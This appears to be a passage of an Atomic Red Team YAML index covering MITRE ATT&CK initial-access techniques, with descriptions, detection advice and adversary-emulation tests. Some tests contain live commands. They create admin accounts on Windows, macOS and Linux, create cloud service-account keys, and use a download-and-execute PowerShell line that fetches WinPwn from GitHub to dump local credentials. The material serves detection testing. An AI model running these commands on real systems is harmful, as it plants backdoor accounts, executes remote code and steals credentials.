        url: https://www.commandfive.com/papers/C5_APT_SKHack.pdf
        description: Command Five Pty Ltd. (2011, September). SK Hack by an Advanced
          Persistent Threat. Retrieved April 6, 2018.
      x_mitre_deprecated: false
      revoked: false
      description: "Adversaries may manipulate application software prior to receipt
        by a final consumer for the purpose of data or system compromise. Supply chain
        compromise of software can take place in a number of ways, including manipulation
        of the application source code, manipulation of the update/distribution mechanism
        for that software, or replacing compiled releases with a modified version.\n\nTargeting
        may be specific to a desired victim set or may be distributed to a broad set
        of consumers but only move on to additional tactics on specific victims.(Citation:
        Avast CCleaner3 2018)(Citation: Command Five SK 2011)  "
      modified: '2022-04-28T16:04:36.636Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Compromise Software Supply Chain
      x_mitre_detection: 'Use verification of distributed binaries through hash checking
        or other integrity checking mechanisms. Scan downloads for malicious signatures
        and attempt to test software and updates prior to deployment while taking
        note of potential suspicious activity. '
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'File: File Metadata'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1078.002:
    technique:
      modified: '2023-04-13T17:17:03.605Z'
      name: Domain Accounts
      description: |-
        Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)

        Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_contributors:
      - Jon Sternstein, Stern Security
      x_mitre_deprecated: false
      x_mitre_detection: "Configure robust, consistent account activity audit policies
        across the enterprise and with externally accessible services.(Citation: TechNet
        Audit Policy) Look for suspicious account behavior across systems that share
        accounts, either user, admin, or service accounts. Examples: one account logged
        into multiple systems simultaneously; multiple accounts logged into the same
        machine simultaneously; accounts logged in at odd times or outside of business
        hours. Activity may be from interactive login sessions or process ownership
        from accounts being used to execute binaries on a remote system as a particular
        account. Correlate other security systems with login information (e.g., a
        user has an active login session but has not entered the building or does
        not have VPN access).\n\nOn Linux, check logs and other artifacts created
        by use of domain authentication services, such as the System Security Services
        Daemon (sssd).(Citation: Ubuntu SSSD Docs) \n\nPerform regular audits of domain
        accounts to detect accounts that may have been created by an adversary for
        persistence."
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'User Account: User Account Authentication'
      - 'Logon Session: Logon Session Creation'
      - 'Logon Session: Logon Session Metadata'
      x_mitre_permissions_required:
      - User
      - Administrator
      type: attack-pattern
      id: attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f
      created: '2020-03-13T20:21:54.758Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1078/002
        external_id: T1078.002
      - source_name: TechNet Credential Theft
        description: Microsoft. (2016, April 15). Attractive Accounts for Credential
          Theft. Retrieved June 3, 2016.
        url: https://technet.microsoft.com/en-us/library/dn535501.aspx
      - source_name: TechNet Audit Policy
        description: Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved
          June 3, 2016.
        url: https://technet.microsoft.com/en-us/library/dn487457.aspx
      - source_name: Microsoft AD Accounts
        description: Microsoft. (2019, August 23). Active Directory Accounts. Retrieved
          March 13, 2020.
        url: https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts
      - source_name: Ubuntu SSSD Docs
        description: Ubuntu. (n.d.). SSSD. Retrieved September 23, 2021.
        url: https://ubuntu.com/server/docs/service-sssd
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1194:
    technique:
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--d3df754e-997b-4cf9-97d4-70feb3120847
      type: attack-pattern
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1194
        external_id: T1194
      - external_id: CAPEC-163
        source_name: capec
        url: https://capec.mitre.org/data/definitions/163.html
      modified: '2020-03-02T19:30:53.487Z'
      name: Spearphishing via Service
      description: "Spearphishing via service is a specific variant of spearphishing.
        It is different from other forms of spearphishing in that it employs the use
        of third party services rather than directly via enterprise email channels.
        \n\nAll forms of spearphishing are electronically delivered social engineering
        targeted at a specific individual, company, or industry. In this scenario,
        adversaries send messages through various social media services, personal
        webmail, and other non-enterprise controlled services. These services are
        more likely to have a less-strict security policy than an enterprise. As with
        most kinds of spearphishing, the goal is to generate rapport with the target
        or get the target's interest in some way. Adversaries will create fake social
        media accounts and message employees for potential job opportunities. Doing
        so allows a plausible reason for asking about services, policies, and software
        that's running in an environment. The adversary can then send malicious links
        or attachments through these services.\n\nA common example is to build rapport
        with a target via social media, then send content to a personal webmail service
        that the target uses on their work computer. This allows an adversary to bypass
        some email restrictions on the work account, and the target is more likely
        to open the file since it's something they were expecting. If the payload
        doesn't work as expected, the adversary can continue normal communications
        and troubleshoot with the target on how to get it working."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_detection: "Because most common third-party services used for spearphishing
        via service leverage TLS encryption, SSL/TLS inspection is generally required
        to detect the initial communication/delivery. With SSL/TLS inspection intrusion
        detection signatures or other security gateway appliances may be able to detect
        malware. \n\nAnti-virus can potentially detect malicious documents and files
        that are downloaded on the user's computer. Endpoint sensing or network sensing
        can potentially detect malicious events once the file is opened (such as a
        Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe)
        for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203)
        and [Scripting](https://attack.mitre.org/techniques/T1064)."
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1200:
    technique:
      modified: '2023-03-30T21:01:40.332Z'
      name: Hardware Additions
      description: |-
        Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.

        While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_deprecated: false
      x_mitre_detection: "Asset management systems may help with the detection of
        computer systems or network devices that should not exist on a network. \n\nEndpoint
        sensors may be able to detect the addition of hardware via USB, Thunderbolt,
        and other external device communication ports."
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      x_mitre_version: '1.6'
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Drive: Drive Creation'
      - 'Network Traffic: Network Traffic Flow'
      type: attack-pattern
      id: attack-pattern--d40239b3-05ff-46d8-9bdd-b46d13463ef9
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1200
        external_id: T1200
      - source_name: Ossmann Star Feb 2011
        description: Michael Ossmann. (2011, February 17). Throwing Star LAN Tap.
          Retrieved March 30, 2018.
        url: https://ossmann.blogspot.com/2011/02/throwing-star-lan-tap.html
      - source_name: Aleks Weapons Nov 2015
        description: Nick Aleks. (2015, November 7). Weapons of a Pentester - Understanding
          the virtual & physical tools used by white/black hat hackers. Retrieved
          March 30, 2018.
        url: https://www.youtube.com/watch?v=lDvf4ScWbcQ
      - source_name: McMillan Pwn March 2012
        description: Robert McMillan. (2012, March 3). The Pwn Plug is a little white
          box that can hack your network. Retrieved March 30, 2018.
        url: https://arstechnica.com/information-technology/2012/03/the-pwn-plug-is-a-little-white-box-that-can-hack-your-network/
      - source_name: Frisk DMA August 2016
        description: Ulf Frisk. (2016, August 5). Direct Memory Attack the Kernel.
          Retrieved March 30, 2018.
        url: https://www.youtube.com/watch?v=fXthwl6ShOg
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
    atomic_tests: []
  T1189:
    technique:
      modified: '2023-04-14T23:58:45.490Z'
      name: Drive-by Compromise
      description: "Adversaries may gain access to a system through a user visiting
        a website over the normal course of browsing. With this technique, the user's
        web browser is typically targeted for exploitation, but adversaries may also
        use compromised websites for non-exploitation behavior such as acquiring [Application
        Access Token](https://attack.mitre.org/techniques/T1550/001).\n\nMultiple
        ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)),
        including:\n\n* A legitimate website is compromised where adversaries have
        injected some form of malicious code such as JavaScript, iFrames, and cross-site
        scripting\n* Script files served to a legitimate website from a publicly writeable
        cloud storage bucket are modified by an adversary\n* Malicious ads are paid
        for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))\n*
        Built-in web application interfaces are leveraged for the insertion of any
        other kind of object that can be used to display web content or contain a
        script that executes on the visiting client (e.g. forum posts, comments, and
        other user controllable web content).\n\nOften the website used by an adversary
        is one visited by a specific community, such as government, a particular industry,
        or region, where the goal is to compromise a specific user or set of users
        based on a shared interest. This kind of targeted campaign is often referred
        to a strategic web compromise or watering hole attack. There are several known
        examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)\n\nTypical
        drive-by compromise process:\n\n1. A user visits a website that is used to
        host the adversary controlled content.\n2. Scripts automatically execute,
        typically searching versions of the browser and plugins for a potentially
        vulnerable version. \n    * The user may be required to assist in this process
        by enabling scripting or active website components and ignoring warning dialog
        boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to
        the browser.\n4. If exploitation is successful, then it will give the adversary
        code execution on the user's system unless other protections are in place.\n
        \   * In some cases a second visit to the website after the initial scan is
        required before exploit code is delivered.\n\nUnlike [Exploit Public-Facing
        Application](https://attack.mitre.org/techniques/T1190), the focus of this
        technique is to exploit software on a client endpoint upon visiting a website.
        This will commonly give an adversary access to systems on the internal network
        instead of external systems that may be in a DMZ.\n\nAdversaries may also
        use compromised websites to deliver a user to a malicious application designed
        to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s,
        like OAuth tokens, to gain access to protected applications and information.
        These malicious applications have been delivered through popups on legitimate
        websites.(Citation: Volexity OceanLotus Nov 2017)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_contributors:
      - Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services)
      - Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before.

        Network intrusion detection systems, sometimes with SSL/TLS inspection, can be used to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code.

        Detecting compromise based on the drive-by exploit from a legitimate website may be difficult. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      - SaaS
      x_mitre_version: '1.5'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Content'
      - 'File: File Creation'
      - 'Application Log: Application Log Content'
      type: attack-pattern
      id: attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1189
        external_id: T1189
      - source_name: Shadowserver Strategic Web Compromise
        description: Adair, S., Moran, N. (2012, May 15). Cyber Espionage & Strategic
          Web Compromises â€“ Trusted Websites Serving Dangerous Results. Retrieved
          March 13, 2018.
        url: http://blog.shadowserver.org/2012/05/15/cyber-espionage-strategic-web-compromises-trusted-websites-serving-dangerous-results/
      - source_name: Volexity OceanLotus Nov 2017
        description: 'Lassalle, D., et al. (2017, November 6). OceanLotus Blossoms:
          Mass Digital Surveillance and Attacks Targeting ASEAN, Asian Nations, the
          Media, Human Rights Groups, and Civil Society. Retrieved November 6, 2017.'
        url: https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1078.004:
    technique:
      modified: '2023-03-21T13:17:14.441Z'
      name: 'Valid Accounts: Cloud Accounts'
      description: |-
        Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management systems, such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)

        Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a [Trusted Relationship](https://attack.mitre.org/techniques/T1199). Similar to [Domain Accounts](https://attack.mitre.org/techniques/T1078/002), compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.

        Once a cloud account is compromised, an adversary may perform [Account Manipulation](https://attack.mitre.org/techniques/T1098) - for example, by adding [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) - to maintain persistence and potentially escalate their privileges.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_contributors:
      - Jon Sternstein, Stern Security
      x_mitre_deprecated: false
      x_mitre_detection: Monitor the activity of cloud accounts to detect abnormal
        or malicious behavior, such as accessing information outside of the normal
        function of the account or account usage at atypical hours.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Google Workspace
      x_mitre_version: '1.5'
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Metadata'
      - 'Logon Session: Logon Session Creation'
      - 'User Account: User Account Authentication'
      x_mitre_permissions_required:
      - User
      - Administrator
      type: attack-pattern
      id: attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65
      created: '2020-03-13T20:36:57.378Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1078/004
        external_id: T1078.004
      - source_name: AWS Identity Federation
        description: Amazon. (n.d.). Identity Federation in AWS. Retrieved March 13,
          2020.
        url: https://aws.amazon.com/identity/federation/
      - source_name: Google Federating GC
        description: Google. (n.d.). Federating Google Cloud with Active Directory.
          Retrieved March 13, 2020.
        url: https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction
      - source_name: Microsoft Deploying AD Federation
        description: Microsoft. (n.d.). Deploying Active Directory Federation Services
          in Azure. Retrieved March 13, 2020.
        url: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1078.004
    atomic_tests:
    - name: Creating GCP Service Account and Service Account Key
      auto_generated_guid: 9fdd83fd-bd53-46e5-a716-9dec89c8ae8e
      description: 'GCP Service Accounts can be used to gain intial access as well
        as maintain persistence inside Google Cloud.

        '
      supported_platforms:
      - google-workspace
      - iaas:gcp
      input_arguments:
        project-id:
          description: ID of the project, you want to create service account as well
            as service account key for
          type: string
          default: art-project-1
        service-account-name:
          description: Name of the service account
          type: string
          default: gcp-art-service-account-1
        service-account-email:
          description: Email of the service account
          type: string
          default: gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com
        output-key-file:
          description: Email of the service account
          type: string
          default: gcp-art-service-account-1.json
      executor:
        name: sh
        elevation_required: false
        command: |
          gcloud auth login --no-launch-browser
          gcloud config set project #{project-id}
          gcloud iam service-accounts create #{service-account-name}
          gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}
        cleanup_command: 'gcloud iam service-accounts delete #{service-account-email}
          --quiet

          '
      dependency_executor_name: sh
      dependencies:
      - description: 'Requires gcloud

          '
        prereq_command: 'if [ -x "$(command -v gcloud)" ]; then exit 0; else exit
          1; fi;

          '
        get_prereq_command: 'echo "Please Install Google Cloud SDK before running
          this atomic test : https://cloud.google.com/sdk/docs/install"

          '
    - name: Azure Persistence Automation Runbook Created or Modified
      auto_generated_guid: 348f4d14-4bd3-4f6b-bd8a-61237f78b3ac
      description: |
        Identifies when an Azure Automation runbook is created or modified. An adversary may create or modify an Azure
        Automation runbook to execute malicious code and maintain persistence in their target's environment.
      supported_platforms:
      - iaas:azure
      input_arguments:
        username:
          description: Azure username
          type: string
          default: 
        password:
          description: Azure password
          type: string
          default: 
        resource_group:
          description: Name of the resource group
          type: string
          default: 
        runbook_name:
          description: Name of the runbook name
          type: string
          default: 
        automation_account_name:
          description: Name of the automation account name
          type: string
          default: 
      dependency_executor_name: powershell
      dependencies:
      - description: 'Check if terraform is installed.

          '
        prereq_command: 'terraform version

          '
        get_prereq_command: 'echo Please install terraform.

          '
      - description: 'Install-Module -Name Az

          '
        prereq_command: 'try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue)
          {exit 0} else {exit 1}} catch {exit 1}

          '
        get_prereq_command: 'Install-Module -Name Az -Scope CurrentUser -Force

          '
      - description: 'Check if the user is logged into Azure.

          '
        prereq_command: 'az account show

          '
        get_prereq_command: "echo Configure your Azure account using: az login. \n"
      - description: 'Create dependency resources using terraform

          '
        prereq_command: 'try {if (Test-Path $PathToAtomicsFolder/T1078.004/src/T1078.004-2/terraform.tfstate
          ){ exit 0 } else {exit 1}} catch {exit 1}

          '
        get_prereq_command: |
          cd $PathToAtomicsFolder/T1078.004/src/T1078.004-2/
          terraform init
          terraform apply -auto-approve
      executor:
        command: |
          $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
          $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
          Connect-AzAccount -Credential $creds
          New-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName #{resource_group} -Description 'my-test-runbook' -AutomationAccountName #{automation_account_name}
        name: powershell
        elevation_required: false
        cleanup_command: |
          Remove-AzAutomationRunbook -AutomationAccountName #{automation_account_name} -Name #{runbook_name} -ResourceGroupName #{resource_group} -Force
          cd $PathToAtomicsFolder/T1078.004/src/T1078.004-2/
          terraform destroy -auto-approve
  T1566.003:
    technique:
      modified: '2023-03-30T21:01:50.401Z'
      name: Spearphishing via Service
      description: "Adversaries may send spearphishing messages via third-party services
        in an attempt to gain access to victim systems. Spearphishing via service
        is a specific variant of spearphishing. It is different from other forms of
        spearphishing in that it employs the use of third party services rather than
        directly via enterprise email channels. \n\nAll forms of spearphishing are
        electronically delivered social engineering targeted at a specific individual,
        company, or industry. In this scenario, adversaries send messages through
        various social media services, personal webmail, and other non-enterprise
        controlled services. These services are more likely to have a less-strict
        security policy than an enterprise. As with most kinds of spearphishing, the
        goal is to generate rapport with the target or get the target's interest in
        some way. Adversaries will create fake social media accounts and message employees
        for potential job opportunities. Doing so allows a plausible reason for asking
        about services, policies, and software that's running in an environment. The
        adversary can then send malicious links or attachments through these services.\n\nA
        common example is to build rapport with a target via social media, then send
        content to a personal webmail service that the target uses on their work computer.
        This allows an adversary to bypass some email restrictions on the work account,
        and the target is more likely to open the file since it's something they were
        expecting. If the payload doesn't work as expected, the adversary can continue
        normal communications and troubleshoot with the target on how to get it working."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_detection: "Because most common third-party services used for spearphishing
        via service leverage TLS encryption, SSL/TLS inspection is generally required
        to detect the initial communication/delivery. With SSL/TLS inspection intrusion
        detection signatures or other security gateway appliances may be able to detect
        malware. \n\nAnti-virus can potentially detect malicious documents and files
        that are downloaded on the user's computer. Endpoint sensing or network sensing
        can potentially detect malicious events once the file is opened (such as a
        Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe)
        for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203)
        or usage of malicious scripts."
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '2.0'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Application Log: Application Log Content'
      - 'Network Traffic: Network Traffic Flow'
      type: attack-pattern
      id: attack-pattern--f6ad61ee-65f3-4bd0-a3f5-2f0accb36317
      created: '2020-03-02T19:24:00.951Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1566/003
        external_id: T1566.003
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
    atomic_tests: []
  T1078.003:
    technique:
      modified: '2023-04-13T17:17:49.889Z'
      name: 'Valid Accounts: Local Accounts'
      description: "Adversaries may obtain and abuse credentials of a local account
        as a means of gaining Initial Access, Persistence, Privilege Escalation, or
        Defense Evasion. Local accounts are those configured by an organization for
        use by users, remote support, services, or for administration on a single
        system or service.\n\nLocal Accounts may also be abused to elevate privileges
        and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).
        Password reuse may allow the abuse of local accounts across a set of machines
        on a network for the purposes of Privilege Escalation and Lateral Movement. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_deprecated: false
      x_mitre_detection: Perform regular audits of local system accounts to detect
        accounts that may have been created by an adversary for persistence. Look
        for suspicious account behavior, such as accounts logged in at odd times or
        outside of business hours.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Containers
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Metadata'
      - 'User Account: User Account Authentication'
      - 'Logon Session: Logon Session Creation'
      x_mitre_permissions_required:
      - Administrator
      - User
      type: attack-pattern
      id: attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2
      created: '2020-03-13T20:26:46.695Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1078/003
        external_id: T1078.003
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1078.003
    atomic_tests:
    - name: Create local account with admin privileges
      auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
      description: After execution the new account will be active and added to the
        Administrators group
      supported_platforms:
      - windows
      input_arguments:
        password:
          description: Password for art-test user
          type: string
          default: "-4RTisCool!-321"
      executor:
        command: |-
          net user art-test /add
          net user art-test #{password}
          net localgroup administrators art-test /add
        cleanup_command: |-
          net localgroup administrators art-test /delete >nul 2>&1
          net user art-test /delete >nul 2>&1
        name: command_prompt
        elevation_required: true
    - name: Create local account with admin privileges - MacOS
      auto_generated_guid: f1275566-1c26-4b66-83e3-7f9f7f964daa
      description: After execution the new account will be active and added to the
        Administrators group
      supported_platforms:
      - macos
      executor:
        command: |-
          dscl . -create /Users/AtomicUser
          dscl . -create /Users/AtomicUser UserShell /bin/bash
          dscl . -create /Users/AtomicUser RealName "Atomic User"
          dscl . -create /Users/AtomicUser UniqueID 503
          dscl . -create /Users/AtomicUser PrimaryGroupID 503
          dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser
          dscl . -passwd /Users/AtomicUser mySecretPassword
          dscl . -append /Groups/admin GroupMembership AtomicUser
        cleanup_command: sudo dscl . -delete /Users/AtomicUser
        name: bash
        elevation_required: true
    - name: Create local account with admin privileges using sysadminctl utility -
        MacOS
      auto_generated_guid: 191db57d-091a-47d5-99f3-97fde53de505
      description: After execution the new account will be active and added to the
        Administrators group
      supported_platforms:
      - macos
      executor:
        command: sysadminctl interactive -addUser art-tester -fullName ARTUser -password
          !pass123! -admin
        cleanup_command: sysadminctl interactive -deleteUser art-tester
        name: bash
        elevation_required: true
    - name: Enable root account using dsenableroot utility - MacOS
      auto_generated_guid: 20b40ea9-0e17-4155-b8e6-244911a678ac
      description: After execution the current/new user will have root access
      supported_platforms:
      - macos
      executor:
        command: |-
          dsenableroot #current user
          dsenableroot -u art-tester -p art-tester -r art-root #new user
        cleanup_command: |-
          dsenableroot -d #current user
          dsenableroot -d -u art-tester -p art-tester #new user
        name: bash
        elevation_required: true
    - name: Add a new/existing user to the admin group using dseditgroup utility -
        macOS
      auto_generated_guid: 433842ba-e796-4fd5-a14f-95d3a1970875
      description: After execution the current/new user will be added to the Admin
        group
      supported_platforms:
      - macos
      executor:
        command: dseditgroup -o edit -a art-user -t user admin
        cleanup_command: dseditgroup -o edit -d art-user -t user admin
        name: bash
        elevation_required: true
    - name: WinPwn - Loot local Credentials - powerhell kittie
      auto_generated_guid: 9e9fd066-453d-442f-88c1-ad7911d32912
      description: Loot local Credentials - powerhell kittie technique via function
        of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          obfuskittiedump -consoleoutput -noninteractive
        name: powershell
        elevation_required: true
    - name: WinPwn - Loot local Credentials - Safetykatz
      auto_generated_guid: e9fdb899-a980-4ba4-934b-486ad22e22f4
      description: Loot local Credentials - Safetykatz technique via function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          safedump -consoleoutput -noninteractive
        name: powershell
        elevation_required: true
    - name: Create local account (Linux)
      auto_generated_guid: 02a91c34-8a5b-4bed-87af-501103eb5357
      description: 'An adversary may wish to create an account with admin privileges
        to work with. In this test we create a "art" user with the password art, switch
        to art, execute whoami, exit and delete the art user.

        '
      supported_platforms:
      - linux
      executor:
        name: bash
        elevation_required: true
        command: |
          useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art
          su art
          whoami
          exit
        cleanup_command: "userdel -r art \n"
